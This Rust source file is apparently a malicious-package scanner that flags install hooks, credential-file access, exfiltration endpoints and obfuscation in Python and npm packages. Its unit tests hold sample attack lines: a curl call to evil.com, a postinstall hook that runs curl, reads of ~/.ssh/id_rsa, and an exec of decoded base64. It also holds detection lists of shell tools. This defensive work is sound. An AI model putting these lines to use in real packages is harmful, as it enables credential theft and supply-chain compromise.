use regex::Regex;
use serde::{Deserialize, Serialize};


/// Severity level for findings.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

/// A single suspicious finding in a package.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub category: String,
    pub description: String,
    pub file: String,
    pub line: Option<usize>,
    pub snippet: Option<String>,
}

/// Results of analyzing a package.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AnalysisResult {
    pub package_name: String,
    pub findings: Vec<Finding>,
    pub risk_score: f64,
}

impl AnalysisResult {
    pub fn is_safe(&self) -> bool {
        self.findings.iter().all(|f| f.severity <= Severity::Low)
    }

    pub fn highest_severity(&self) -> Option<&Severity> {
        self.findings.iter().map(|f| &f.severity).max()
    }
}

/// Patterns that indicate suspicious behavior in Python files.
struct SuspiciousPattern {
    pattern: Regex,
    severity: Severity,
    category: &'static str,
    description: &'static str,
}

/// Analyze the content of a setup.py or similar Python install script.
pub fn analyze_python_setup(content: &str, filename: &str) -> Vec<Finding> {
    let patterns = python_suspicious_patterns();
    let mut findings = Vec::new();

    for (line_no, line) in content.lines().enumerate() {
        for pat in &patterns {
            if pat.pattern.is_match(line) {
                findings.push(Finding {
                    severity: pat.severity.clone(),
                    category: pat.category.to_string(),
                    description: pat.description.to_string(),
                    file: filename.to_string(),
                    line: Some(line_no + 1),
                    snippet: Some(truncate_line(line, 120)),
                });
            }
        }
    }

    // Check for obfuscation indicators
    findings.extend(check_obfuscation(content, filename));

    findings
}

/// Analyze the content of a package.json.
pub fn analyze_package_json(content: &str, filename: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    let json: Result<serde_json::Value, _> = serde_json::from_str(content);
    let json = match json {
        Ok(v) => v,
        Err(_) => {
            findings.push(Finding {
                severity: Severity::Medium,
                category: "parse_error".to_string(),
                description: "Invalid JSON in package.json".to_string(),
                file: filename.to_string(),
                line: None,
                snippet: None,
            });
            return findings;
        }
    };

    // Check lifecycle scripts
    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        let dangerous_hooks = [
            "preinstall", "postinstall", "preuninstall", "postuninstall",
            "prepublish", "prepare",
        ];

        for hook in &dangerous_hooks {
            if let Some(script) = scripts.get(*hook).and_then(|s| s.as_str()) {
                let severity = if contains_dangerous_command(script) {
                    Severity::Critical
                } else if *hook == "preinstall" || *hook == "postinstall" {
                    Severity::High
                } else {
                    Severity::Medium
                };

                findings.push(Finding {
                    severity,
                    category: "lifecycle_script".to_string(),
                    description: format!("Lifecycle script '{hook}' detected: {}", truncate_line(script, 80)),
                    file: filename.to_string(),
                    line: None,
                    snippet: Some(script.to_string()),
                });
            }
        }
    }

    // Check for suspicious dependencies
    if let Some(deps) = json.get("dependencies").and_then(|d| d.as_object()) {
        for (name, version) in deps {
            if let Some(ver) = version.as_str() {
                if ver.starts_with("git+") || ver.starts_with("http") {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        category: "remote_dependency".to_string(),
                        description: format!("Dependency '{name}' installed from URL: {ver}"),
                        file: filename.to_string(),
                        line: None,
                        snippet: None,
                    });
                }
            }
        }
    }

    findings
}

/// Analyze generic source file for suspicious patterns.
pub fn analyze_source_file(content: &str, filename: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Network exfiltration patterns
    let exfil_patterns = [
        (r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "Hardcoded IP address in URL"),
        (r"(?i)discord\.com/api/webhooks", "Discord webhook (potential exfiltration)"),
        (r"(?i)telegram\.org/bot", "Telegram bot API (potential exfiltration)"),
        (r"(?i)ngrok\.io", "Ngrok tunnel (potential C2)"),
    ];

    for (pattern, desc) in &exfil_patterns {
        if let Ok(re) = Regex::new(pattern) {
            for (line_no, line) in content.lines().enumerate() {
                if re.is_match(line) {
                    findings.push(Finding {
                        severity: Severity::High,
                        category: "network_exfiltration".to_string(),
                        description: desc.to_string(),
                        file: filename.to_string(),
                        line: Some(line_no + 1),
                        snippet: Some(truncate_line(line, 120)),
                    });
                }
            }
        }
    }

    findings
}

/// Calculate a risk score from 0.0 (safe) to 1.0 (extremely dangerous).
pub fn calculate_risk_score(findings: &[Finding]) -> f64 {
    if findings.is_empty() {
        return 0.0;
    }

    let score: f64 = findings.iter().map(|f| match f.severity {
        Severity::Info => 0.0,
        Severity::Low => 0.05,
        Severity::Medium => 0.15,
        Severity::High => 0.35,
        Severity::Critical => 0.6,
    }).sum();

    score.min(1.0)
}

fn python_suspicious_patterns() -> Vec<SuspiciousPattern> {
    vec![
        SuspiciousPattern {
            pattern: Regex::new(r"\bexec\s*\(").unwrap(),
            severity: Severity::High,
            category: "code_execution",
            description: "exec() call — dynamic code execution",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"\beval\s*\(").unwrap(),
            severity: Severity::High,
            category: "code_execution",
            description: "eval() call — dynamic code evaluation",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"\bcompile\s*\(.*exec").unwrap(),
            severity: Severity::High,
            category: "code_execution",
            description: "compile() with exec — dynamic code execution",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"subprocess\.(call|run|Popen|check_output|check_call)\s*\(").unwrap(),
            severity: Severity::High,
            category: "process_spawn",
            description: "subprocess call — spawns external process",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"os\.(system|popen|exec[lv]?p?e?)\s*\(").unwrap(),
            severity: Severity::High,
            category: "process_spawn",
            description: "os.system/popen/exec — spawns external process",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"__import__\s*\(").unwrap(),
            severity: Severity::Medium,
            category: "dynamic_import",
            description: "__import__() — dynamic module import",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"base64\.(b64decode|decodebytes)\s*\(").unwrap(),
            severity: Severity::Medium,
            category: "obfuscation",
            description: "base64 decode — potential obfuscated payload",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"codecs\.decode\s*\(").unwrap(),
            severity: Severity::Medium,
            category: "obfuscation",
            description: "codecs.decode — potential obfuscated payload",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"(?i)(requests|urllib|http\.client)\.(get|post|put)\s*\(").unwrap(),
            severity: Severity::Medium,
            category: "network",
            description: "HTTP request in install script",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"socket\.socket\s*\(").unwrap(),
            severity: Severity::High,
            category: "network",
            description: "Raw socket creation",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"(?i)(\.ssh|\.aws|\.env|\.git/config|\.npmrc|\.pypirc)").unwrap(),
            severity: Severity::Critical,
            category: "credential_access",
            description: "Access to credential/config files",
        },
        SuspiciousPattern {
            pattern: Regex::new(r"(?i)(password|token|secret|api.key|private.key)\s*=").unwrap(),
            severity: Severity::Medium,
            category: "credential_access",
            description: "Potential credential harvesting",
        },
        SuspiciousPattern {
            pattern: Regex::new(r#"open\s*\(.*['"]/(etc/passwd|etc/shadow)"#).unwrap(),
            severity: Severity::Critical,
            category: "system_access",
            description: "Reading system credential file",
        },
    ]
}

fn check_obfuscation(content: &str, filename: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Long hex strings (>50 chars)
    if let Ok(re) = Regex::new(r#"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){24,}"#) {
        if re.is_match(content) {
            findings.push(Finding {
                severity: Severity::High,
                category: "obfuscation".to_string(),
                description: "Long hex-encoded string".to_string(),
                file: filename.to_string(),
                line: None,
                snippet: None,
            });
        }
    }

    // Long base64 strings
    if let Ok(re) = Regex::new(r#"['"]\s*[A-Za-z0-9+/]{100,}={0,2}\s*['"]"#) {
        if re.is_match(content) {
            findings.push(Finding {
                severity: Severity::Medium,
                category: "obfuscation".to_string(),
                description: "Long base64-like string".to_string(),
                file: filename.to_string(),
                line: None,
                snippet: None,
            });
        }
    }

    // chr() chains: chr(104) + chr(101) + ...
    if let Ok(re) = Regex::new(r"chr\(\d+\)\s*\+\s*chr\(\d+\)(\s*\+\s*chr\(\d+\)){3,}") {
        if re.is_match(content) {
            findings.push(Finding {
                severity: Severity::High,
                category: "obfuscation".to_string(),
                description: "Character code chain detected (string obfuscation)".to_string(),
                file: filename.to_string(),
                line: None,
                snippet: None,
            });
        }
    }

    // Extremely long single lines (>500 chars, common in obfuscated code)
    for (i, line) in content.lines().enumerate() {
        if line.len() > 500 && !line.starts_with('#') && !line.starts_with("//") {
            // Exclude common false positives like data arrays
            if !line.contains("data:image") && !line.contains("base64,") {
                findings.push(Finding {
                    severity: Severity::Low,
                    category: "obfuscation".to_string(),
                    description: format!("Extremely long line ({} chars) — possible obfuscation", line.len()),
                    file: filename.to_string(),
                    line: Some(i + 1),
                    snippet: Some(truncate_line(line, 80)),
                });
            }
        }
    }

    findings
}

fn contains_dangerous_command(script: &str) -> bool {
    let dangerous = [
        "curl ", "wget ", "powershell", "cmd /c", "bash -c",
        "node -e", "python -c", "eval ", "base64",
    ];
    let lower = script.to_lowercase();
    dangerous.iter().any(|d| lower.contains(d))
}

fn truncate_line(line: &str, max: usize) -> String {
    let trimmed = line.trim();
    if trimmed.len() <= max {
        trimmed.to_string()
    } else {
        format!("{}...", &trimmed[..max])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_exec() {
        let content = r#"
import os
exec(base64.b64decode(payload))
"#;
        let findings = analyze_python_setup(content, "setup.py");
        assert!(findings.iter().any(|f| f.category == "code_execution"));
    }

    #[test]
    fn test_detect_subprocess() {
        let content = r#"
import subprocess
subprocess.call(["curl", "http://evil.com/steal"])
"#;
        let findings = analyze_python_setup(content, "setup.py");
        assert!(findings.iter().any(|f| f.category == "process_spawn"));
    }

    #[test]
    fn test_detect_credential_access() {
        let content = r#"
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    data = f.read()
"#;
        let findings = analyze_python_setup(content, "setup.py");
        assert!(findings.iter().any(|f| f.category == "credential_access"));
    }

    #[test]
    fn test_safe_setup() {
        let content = r#"
from setuptools import setup
setup(
    name="mypackage",
    version="1.0.0",
    packages=["mypackage"],
)
"#;
        let findings = analyze_python_setup(content, "setup.py");
        assert!(findings.is_empty());
    }

    #[test]
    fn test_package_json_postinstall() {
        let content = r#"
{
    "name": "evil-pkg",
    "scripts": {
        "postinstall": "node -e \"require('child_process').exec('curl http://evil.com')\""
    }
}
"#;
        let findings = analyze_package_json(content, "package.json");
        assert!(!findings.is_empty());
        assert!(findings.iter().any(|f| f.severity == Severity::Critical));
    }

    #[test]
    fn test_safe_package_json() {
        let content = r#"
{
    "name": "safe-pkg",
    "version": "1.0.0",
    "scripts": {
        "build": "tsc",
        "test": "jest"
    },
    "dependencies": {
        "express": "^4.18.0"
    }
}
"#;
        let findings = analyze_package_json(content, "package.json");
        assert!(findings.is_empty());
    }

    #[test]
    fn test_hex_obfuscation() {
        let content = r#"
data = "\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x20\x74\x68\x69\x73\x20\x69\x73\x20\x61\x20\x74\x65\x73\x74\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x20\x74\x68\x69\x73\x20\x69\x73\x20\x61\x20\x74\x65\x73\x74"
"#;
        let findings = analyze_python_setup(content, "setup.py");
        assert!(findings.iter().any(|f| f.category == "obfuscation"));
    }

    #[test]
    fn test_risk_score() {
        let findings = vec![
            Finding {
                severity: Severity::Critical,
                category: "test".to_string(),
                description: "test".to_string(),
                file: "test".to_string(),
                line: None,
                snippet: None,
            },
        ];
        let score = calculate_risk_score(&findings);
        assert!(score > 0.5);
    }

    #[test]
    fn test_risk_score_empty() {
        assert_eq!(calculate_risk_score(&[]), 0.0);
    }

    #[test]
    fn test_hardcoded_ip() {
        let content = r#"requests.get("http://192.168.1.1/data")"#;
        let findings = analyze_source_file(content, "evil.py");
        assert!(findings.iter().any(|f| f.category == "network_exfiltration"));
    }
}
